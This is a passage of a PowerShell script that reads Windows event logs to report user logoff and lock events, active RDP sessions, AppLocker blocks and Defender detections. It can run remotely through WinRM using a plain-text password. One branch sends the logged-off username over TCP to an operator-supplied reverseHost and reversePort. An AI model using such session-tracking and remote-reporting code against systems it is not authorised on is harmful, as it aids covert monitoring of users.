                                            $sessionConnectedUsername=(Get-EventLog -LogName Security -Instanceid 4778 -newest 1 | Where {$_.message -match "Account Name:\s*"} | Select -property MachineName,@{Name="Username";Expression={$_.ReplacementStrings[0]}}).Username
                                            $sessionConnectedMachine=(Get-EventLog -LogName Security -Instanceid 4778 -newest 1 | Where {$_.message -match "Account Name:\s*"} | Select -property MachineName).MachineName
                                            Write-Host "[+] User $sessionDisconnectedMachine\$sessionDisconnectedUsername disconnected from his terminal at"$sessionDisconnected.TimeGenerated"and connected as $sessionConnectedMachine\$sessionConnectedUsername at"$sessionConnected.TimeGenerated -ForegroundColor Green#>
                             }#6

                            

                            }
                            else
                            {
                                        #write-Host "[+] The screen saver is invoked -"$eventArray[$x]"/"($eventArray[$x]+1)"event IDs" -ForegroundColor Green
                                        #write-Host "[+] The workstation is locked / The screen saver is invoked" -ForegroundColor Green
                                        <#SCREEN SAVER OUTPUT / NOTHING HERE AS OUTPUT#>

                                        666666
                                       
                            }#5

                            
                         } 
                         else
                         {
                             <# NOTHING HERE #>
                         }#4
                         #####################################################################################################################################################################
                          
                   }#3.5
                    
                 }
                 else
                 {
                       
                       Write-Host "[+] User $domainName\$currentUser is logged off" -ForegroundColor Green
                       
                       if(($using:reverseHost -and $using:reversePort) -ne "")
                       {
                       Invoke-Command -ScriptBlock {

                    
                              $whoami="$domainName\$currentUser"
                              $TcpClient = New-Object System.Net.Sockets.TcpClient
	                          try
                              {
                                $Tcpclient.Connect($using:reverseHost,$using:reversePort)
                                $t=$Tcpclient.GetStream()
	                            $data=[System.Text.Encoding]::ASCII.GetBytes($whoami)
	                            $t.Write($data,0,$data.length)

                              }
                              catch
                              {
                                 Write-Host "No connection could be made with $using:reverseHost on port $using:reversePort"
                              }
                           
                           }

                        }
                        else
                        {
                            Write-Host "[!] You can provide -reverseHost and -reversePort flags to send the results to the server!" -ForegroundColor Yellow
                            Write-Output "`n"
                        }


                    }#3
               
                         

             }
             else
             {
                     <# Nothing Here#>
                   
             }#2
                   
         
     }#End For

   

}


function RDPConn($ip)
{
    if($ip -eq "127.0.0.1")
    {
        Invoke-Command -ScriptBlock ${function:RDPCore}

        
    }
    else
    {
        #Get all winRM connections
        $winrmUniqueSessions=Get-PSSession | Get-Unique
        if($winrmUniqueSessions)
        {
            for($x=0;$x -le ($winrmUniqueSessions).length;$x++)
            {
                if($winrmUniqueSessions[$x])
                {
                
                   #Check for active RDP connections using WinRM
                    Invoke-Command -Session (Get-PSSession -Id $winrmUniqueSessions[$x].id) -ScriptBlock ${function:RDPCore}
                
                
                } 
         
            }
        }
        else
        {
            Write-Host "[!] No WinRM Session found" -ForegroundColor Red
        }

    }

}

function RDPCore
{
    
   
    #Datetime for logs, 2 days before
    $twodaysBefore=Get-date -date $(get-date).adddays(-2)

    #Get today's events - 1149
    $AuthSucceded=Get-WinEvent "Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational" | where-object {($_.timecreated -ge $twodaysBefore) -and ($_.id -eq 1149)} | where {$_.message -notmatch "Remote Desktop Services:\s*\w+\$" } | Select -Property timecreated,MachineName,@{Name="username";Expression={$_.Properties[0].value}},@{Name="Source IP";Expression={$_.Properties[2].value}}
    
    #Get today's events - 25, for all users/sessions ids
    $rdpSessionReconn=Get-WinEvent "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" | where-object {($_.timecreated -ge $twodaysBefore) -and ($_.id -eq 25)} | where {$_.message -notmatch "Remote Desktop Services:\s*\w+\$" } | Select -Property timecreated,@{Name="username";Expression={$_.Properties[0].value}},@{Name="Session ID";Expression={$_.Properties[1].value}},@{Name="Source IP";Expression={$_.Properties[2].value}}# | where {$_."Source IP" -notmatch "LOCAL"}
    #Group todays event - 25 by sessionID to avoid double records
    $grouprdpSessionReconn=(Get-WinEvent "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" | where-object {($_.timecreated -ge $twodaysBefore) -and ($_.id -eq 25)} | where {$_.message -notmatch "Remote Desktop Services:\s*\w+\$" } | Select -Property timecreated,@{Name="username";Expression={$_.Properties[0].value}},@{Name="Session ID";Expression={$_.Properties[1].value}},@{Name="Source IP";Expression={$_.Properties[2].value}}<#| where {$_."Source IP" -notmatch "LOCAL"}#>| Group-Object {$_."Session ID"})
    #Create empty array to add last "Reconnected sessions" for every session ID  
    $rdpSessionLastReconn = New-Object System.Collections.ArrayList
    #Add dummy line to bypass the problem with 1 entry
    #$rdpSessionLastRecon.Add("") | Out-Null
    #check if the length is only 1
    if($grouprdpSessionReconn.count -eq 1)
    {

        $rdpSessionLastReconn.add((Get-WinEvent "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" | where-object {($_.timecreated -ge $twodaysBefore) -and ($_.id -eq 25)} | where {$_.message -notmatch "Remote Desktop Services:\s*\w+\$" } | Select -Property timecreated,MachineName,@{Name="username";Expression={$_.Properties[0].value}},@{Name="Session ID";Expression={$_.Properties[1].value}},@{Name="Source IP";Expression={$_.Properties[2].value}} <#| where {$_."Source IP" -notmatch "LOCAL"}#> | where {($_."TimeCreated" -as [datetime]) -and ($_."Session ID" -eq $grouprdpSessionReconn.Name)} | select-object -first 1)) | Out-Null
        
    }
    else
    {
        #Find the latest session for all unique  sessionIDs, event - 25 - More than 1 session
        for($x=0;$x -lt $grouprdpSessionReconn.length;$x++)
        {
            
            $rdpSessionLastReconn.add((Get-WinEvent "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" | where-object {($_.timecreated -ge $twodaysBefore) -and ($_.id -eq 25)} | where {$_.message -notmatch "Remote Desktop Services:\s*\w+\$" } | Select -Property timecreated,MachineName,@{Name="username";Expression={$_.Properties[0].value}},@{Name="Session ID";Expression={$_.Properties[1].value}},@{Name="Source IP";Expression={$_.Properties[2].value}} <#| where {$_."Source IP" -notmatch "LOCAL"}#> | where {($_."TimeCreated" -as [datetime]) -and ($_."Session ID" -eq $grouprdpSessionReconn[$x].Name)} | select-object -first 1)) | Out-Null
        }

    }
    
    
    
    
    #Get today's events - 24, for all users/sessions ids
    $rdpUserDisc=Get-WinEvent "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" | where-object {($_.timecreated -ge $twodaysBefore) -and ($_.id -eq 24)} | where {$_.message -notmatch "Remote Desktop Services:\s*\w+\$" } | Select -Property timecreated,@{Name="username";Expression={$_.Properties[0].value}},@{Name="Source IP";Expression={$_.Properties[2].value}},@{Name="Session ID";Expression={$_.Properties[1].value}}# | where {$_."Source IP" -notmatch "LOCAL"}
    #Group todays event - 24 by sessionID to avoid double records
    $grouprdpUserDisc=(Get-WinEvent "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" | where-object {($_.timecreated -ge $twodaysBefore) -and ($_.id -eq 24)} | where {$_.message -notmatch "Remote Desktop Services:\s*\w+\$" } | Select -Property timecreated,@{Name="username";Expression={$_.Properties[0].value}},@{Name="Source IP";Expression={$_.Properties[2].value}},@{Name="Session ID";Expression={$_.Properties[1].value}} <#| where {$_."Source IP" -notmatch "LOCAL"}#> | Group-Object {$_."Session ID"})
    #Create empty aray to add last "Disconnected Sessions" for every session ID
    $rdpSessionLastDisc = New-Object System.Collections.ArrayList
    #Add dummy line to bypass the problem with 1 entry
    
    #check if the length is 1
    if($grouprdpUserDisc.count -eq 1)
    {
        #$rdpSessionLastDisc.Add("") | Out-Null
        $rdpSessionLastDisc.add((Get-WinEvent "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" | where-object {($_.timecreated -ge $twodaysBefore) -and ($_.id -eq 24)} | where {$_.message -notmatch "Remote Desktop Services:\s*\w+\$" } | Select -Property timecreated,@{Name="username";Expression={$_.Properties[0].value}},@{Name="Session ID";Expression={$_.Properties[1].value}},@{Name="Source IP";Expression={$_.Properties[2].value}} <#| where {$_."Source IP" -notmatch "LOCAL"}#> | where {($_."TimeCreated" -as [datetime]) -and ($_."Session ID" -eq $grouprdpUserDisc.Name)} | select-object -first 1)) | Out-Null
        
    }
    else
    {
        #Find the latest session for all unique session IDs, event - 24 - More than session
        for($x=0;$x -lt $grouprdpUserDisc.length;$x++)
        {
            $rdpSessionLastDisc.add((Get-WinEvent "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" | where-object {($_.timecreated -ge $twodaysBefore) -and ($_.id -eq 24)} | where {$_.message -notmatch "Remote Desktop Services:\s*\w+\$" } | Select -Property timecreated,@{Name="username";Expression={$_.Properties[0].value}},@{Name="Session ID";Expression={$_.Properties[1].value}},@{Name="Source IP";Expression={$_.Properties[2].value}} <#| where {$_."Source IP" -notmatch "LOCAL"}#> | where {($_."TimeCreated" -as [datetime]) -and ($_."Session ID" -eq $grouprdpUserDisc[$x].Name)} | select-object -first 1)) | Out-Null
        }
    }
    
         
    
    #Get today's events - 21, for all users/sessions ids
    $rdpSessLogonSucc=Get-WinEvent "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" | where-object {($_.timecreated -ge $twodaysBefore) -and ($_.id -eq 21)} | where {$_.message -notmatch "Remote Desktop Services:\s*\w+\$" } | Select -Property timecreated,@{Name="username";Expression={$_.Properties[0].value}},@{Name="Source IP";Expression={$_.Properties[2].value}},@{Name="Session ID";Expression={$_.Properties[1].value}}# | where {$_."Source IP" -notmatch "LOCAL"}
    #Group todays event - 21 by sessionID to avoid double records
    $grouprdpSessLogonSucc=(Get-WinEvent "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" | where-object {($_.timecreated -ge $twodaysBefore) -and ($_.id -eq 21)} | where {$_.message -notmatch "Remote Desktop Services:\s*\w+\$" } | Select -Property timecreated,@{Name="username";Expression={$_.Properties[0].value}},@{Name="Source IP";Expression={$_.Properties[2].value}},@{Name="Session ID";Expression={$_.Properties[1].value}}<# | where {$_."Source IP" -notmatch "LOCAL"}#> | Group-Object {$_."Session ID"})
    #Create empty aray to add last "Disconnected Sessions" for every session ID
    $rdpSessLastSucc = New-Object System.Collections.ArrayList
    #Add dummy line into the table to bypass the problem with 1 entry
    #$grouprdpSessLogonSucc.length
    #check if the length of grouped sessions is only 1
    if($grouprdpSessLogonSucc.count -eq 1)
    {
        
        #$rdpSessLastSucc.add("") | Out-Null
        $rdpSessLastSucc.add((Get-WinEvent "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" | where-object {($_.timecreated -ge $twodaysBefore) -and ($_.id -eq 21)} | where {$_.message -notmatch "Remote Desktop Services:\s*\w+\$" } | Select -Property timecreated,@{Name="username";Expression={$_.Properties[0].value}},@{Name="Session ID";Expression={$_.Properties[1].value}},@{Name="Source IP";Expression={$_.Properties[2].value}}<# | where {$_."Source IP" -notmatch "LOCAL"}#> | where {($_."TimeCreated" -as [datetime]) -and ($_."Session ID" -eq $grouprdpSessLogonSucc.Name)} | select-object -first 1)) | Out-Null
    }
    else
    {
        
        #Expand Group-Object
        $expandGrouprdpSessLogonSucc=$grouprdpSessLogonSucc | select-object -Expand Group
        #$expandGrouprdpSessLogonSucc.length
        #Find the latest session for all unique session IDs, event - 21 - More than 1 session
        for($x=0;$x -lt $expandGrouprdpSessLogonSucc.length;$x++)
        {
            
            $rdpSessLastSucc.add((Get-WinEvent "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" | where-object {($_.timecreated -ge $twodaysBefore) -and ($_.id -eq 21)} | where {$_.message -notmatch "Remote Desktop Services:\s*\w+\$" } | Select -Property timecreated,@{Name="username";Expression={$_.Properties[0].value}},@{Name="Session ID";Expression={$_.Properties[1].value}},@{Name="Source IP";Expression={$_.Properties[2].value}}<# | where {$_."Source IP" -notmatch "LOCAL"}#> | where {($_."TimeCreated" -as [datetime]) -and ($_."Session ID" -eq $expandGrouprdpSessLogonSucc[$x]."Session ID")} | select-object -first 1)) | Out-Null
            
        }
    }
    
    
    $tmp=$rdpSessLastSucc
    $rdpALLSessArray = New-Object System.Collections.ArrayList
    

    Write-Output "`n"
    Write-Output "Active RDP Sessions"
    Write-Output "`n"
    #table with active RDP sessions
    
    for($x=0;$x -le $rdpSessionLastReconn.count;$x++)
    {
        
        for($y=0;$y -le $rdpSessionLastDisc.count;$y++)
        {
           
            for($n=0;$n -le $rdpSessLastSucc.count;$n++)
            {
               
                
                #if event id 21 found and disconnection event id 24 is null then a workstation is connected
                #if($rdpSessLastSucc[$n]."Session ID" -eq $rdpSessionLastDisc[$y]."Session ID")
                if($rdpSessionLastDisc)
                {#1
                    
                    #if event 21 exists, successful logon
                    if($tmp[$n])
                    {
                        if($tmp[$n]."Session ID" -eq $rdpSessionLastDisc[$y]."Session ID")
                        {
                            $totalRDPSession=$rdpSessionLastDisc[$y].TimeCreated-$tmp[$n].TimeCreated

                        
                            if($totalRDPSession.TotalMilliseconds -lt 0)
                            {
                            
                                #Write-Host "[+] " -foregroundColor Green -NoNewline;Write-Host "RDP Session"$rdpSessLastSucc[$n]."Session ID" "| User"$rdpSessLastSucc[$n].username"|"$rdpSessLastSucc[$n]."Source IP" "->"$rdpSessLastSucc[$n].MachineName"@"$rdpSessLastSucc[$n].Timecreated
                                $rdpALLSessArray.Add($tmp[$n]) | Out-Null  
                            
                            }
                         }
                      }
                      else
                      {
                            
                            #if event id 25 exists, reconnection
                            if($rdpSessionLastReconn[$x])
                            {
                                if($rdpSessionLastDisc[$y]."Session ID" -eq $rdpSessionLastReconn[$x]."Session ID")
                                {
                                
                                    $totalRDPSession=$rdpSessionLastDisc[$y].TimeCreated-$rdpSessionLastReconn[$x].TimeCreated
                                    if($totalRDPSession.TotalMilliseconds -lt 0)
                                    {
                    
                                        #Write-Host "[+] " -foregroundColor Green -NoNewline;Write-Host "RDP Session"$rdpSessionLastReconn[$x]."Session ID" "| User"$rdpSessionLastReconn[$x].username"|"$rdpSessionLastReconn[$x]."Source IP" "->"$rdpSessionLastReconn[$x].MachineName"@"$rdpSessionLastReconn[$x].Timecreated
                                        $rdpALLSessArray.Add($rdpSessionLastReconn[$x]) | Out-Null
                                    }
                                
                                 }
                             }

                        }

                   }
                   else
                   {
                    
                    
                        $totalRDPSession=$tmp[$n].TimeCreated
                        if($totalRDPSession.TotalMilliseconds -lt 0)
                        {
                            $rdpALLSessArray.Add($tmp[$n]) | Out-Null
                        }
                        

                    }#1

                }


            }
         }
       
         
         $finalRDP=$rdpALLSessArray | sort-object -Property "Session Id" -Unique
         

         if($finalRDP.count -lt 1)
         {
            if($finalRDP -and ($finalRDP."Source IP" -notmatch "LOCAL"))
            {
                
                Write-Host "[+] " -foregroundColor Green -NoNewline;Write-Host "RDP Session"$finalRDP."Session ID" "| User"$finalRDP.username"| Source IP:"$finalRDP."Source IP" "|"$finalRDP.Timecreated
            }
            else
            {
                Write-Host "[-] "-ForegroundColor Red -NoNewline;Write-Host "No active RDP connections"
            }
         }
         else
         {
            
            for($x=0; $x -lt $finalRDP.count;$x++)
            {
                if($finalRDP[$x]."Source IP" -notmatch "LOCAL")
                {
                    Write-Host "[+] " -foregroundColor Green -NoNewline;Write-Host "RDP Session"$finalRDP[$x]."Session ID" "| User"$finalRDP[$x].username"| Source IP:"$finalRDP[$x]."Source IP" "|"$finalRDP[$x].Timecreated
                }
            }
         
         }
         
         
   
}


#https://powershell.org/forums/topic/runas-command-to-run-a-script-under-alternate-user-credentials/
function RunAS($user,$pass,$ip,$eventID,$newest,$users)
{
    
    $PasswordSS = ConvertTo-SecureString  -String $pass -AsPlainText -Force
    $Creds     = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $user,$PasswordSS
    if(($newest -eq '') -or !$newest)
    {
        $newest = 100 #RunAs $newest default value 
        Invoke-Command -ComputerName $ip -Credential $Creds -ScriptBlock ${function:logQuery} -ArgumentList $eventID,$newest,$users
    }
    else
    {
        Invoke-Command -ComputerName $ip -Credential $Creds -ScriptBlock ${function:logQuery} -ArgumentList $eventID,$newest,$users
    }
}


function Get-FinePasswordPolicy
{

    Import-Module ActiveDirectory
    Get-ADFineGrainedPasswordPolicy -Filter { name -like '*' }

}

function ApplockerLogs
{
    [CmdletBinding()]
    Param([string]$eventID,[datetime]$LogCreatedDate)

    

    if($eventID -eq "8004")
	    {
		    try
            {
		        $eventID8004=Get-winEvent -Logname "Microsoft-Windows-applocker/EXE and DLL" -ErrorAction Stop | Select TimeCreated,ProviderName,id,Message,UserID | Where-Object {$_.id -eq $eventID}
		        if((!$LogCreatedDate) -and (($eventID8004).Count -gt 0))
		        {
			        Write-Host "[+] Applocker event (8004) - *.exe, *.com, *.dll, *.ocx"
                    $eventID8004
                    
		        }
		        else
		        {
			        Write-Host "[+] Applocker event (8004) - *.exe, *.com, *.dll, *.ocx"
                    $eventID8004 | where-object {($_.TimeCreated).date -eq $LogCreatedDate}
		        }
            }
            catch
            {
                Write-Output "[-] No logs - Applocker event (8004)"
            }
	    }
	    else
	    {
		    
            try
            {
                $eventID8007=Get-winEvent -Logname "Microsoft-Windows-applocker/MSI and Script" -ErrorAction Stop | Select TimeCreated,ProviderName,id,Message,UserID | Where-Object {$_.id -eq "$eventID"}
		        if((!$LogCreatedDate) -and (($eventID8007).Count -gt 0))
		        {
			        Write-Host "[+] Applocker event (8007) - *.js, *.ps1, *.vbs, *.cmd, *.bat, *.si, *.msp"
                    $eventID8007
		        }
		        else
		        {
			        Write-Host "[+] Applocker event (8007) - *.js, *.ps1, *.vbs, *.cmd, *.bat, *.si, *.msp"
                    $eventID8007 | where-object {($_.TimeCreated).date -eq $LogCreatedDate}
		        }
	        
             }
             catch
             {
                Write-Output "[-] No logs - Applocker (8007)"
             }
          }
}

function WindowsDefender
{
	$mpTD=Get-MpThreatDetection | Select ActionSuccess,AMProductVersion,InitialDetectionTime,ProcessName,RemediationTime,ThreatID,DomainUser
	$mpT=Get-MPThreat | Select DidThreatExecute,Resources,ThreatID,ThreatName,SeverityID,PSComputerName
	$group_mpTD=$mpTD | Group-Object -Property ThreatID

	$group_mpTD_sort=$group_mpTD.Name | Sort-Object
	$mpT_sort=$mpT.ThreatID | Sort-Object

	for($i=0; $i -lt $mpT_sort.count;$i++)
	{
		if($group_mpTD_sort[$i] -eq $mpT_sort[$i])
		{
			$threatDetection=$mpTD | where-object {$_.ThreatID -eq $group_mpTD_sort[$i]}
			$threat=$mpT | where-object {$_.ThreatID -eq $group_mpTD_sort[$i]}
			
			Write-Host "Action Success: "$threatDetection.ActionSuccess
			Write-Host "AMProductVersion: "$threatDetection.AMProductVersion
			Write-Host "InitialDetectionTime: "$threatDetection.InitialDetectionTime
			Write-Host "ProcessName: "$threatDetection.ProcessName
			Write-Host "RemediationTime: "$threatDetection.RemediationTime
			Write-Host "DidThreatExecute: "$threat.DidThreatExecute
			Write-Host "DomainUser: "$threatDetection.DomainUser
			Write-Host "Resources: "$threat.Resources
			Write-Host "ThreatName: "$threat.ThreatName
			Write-Host "Severity: "$threat.SeverityID
			Write-Host "ThreatID: "$threat.ThreatID
			Write-Output "`n"
		}

	}

}